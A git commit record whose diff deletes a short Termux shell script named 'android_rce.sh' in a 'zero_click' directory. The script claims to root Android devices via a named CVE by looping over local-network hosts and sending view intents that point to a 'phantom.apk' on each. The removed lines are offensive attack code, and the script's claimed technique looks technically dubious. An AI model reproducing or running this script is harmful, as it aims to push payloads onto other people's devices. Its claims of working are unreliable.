4f4e0bf3dfe513fcc1a9fd278fbc15e35948164c
VERAN-TECH-HUB <veranmaina685@gmail.com>
2025-02-18 23:28:24 +0100

    Delete core/zero_click directory

--- core/zero_click/android_rce.sh
+++
@@ -1,5 +0,0 @@
-#!/data/data/com.termux/files/usr/bin/bash  
-# Auto-root via CVE-2023-20963  
-for ip in $(arp -n | grep wlan0 | awk '{print $1}'); do  
-  am broadcast -a android.intent.action.VIEW -d "http://$ip:80/phantom.apk"  
-done  
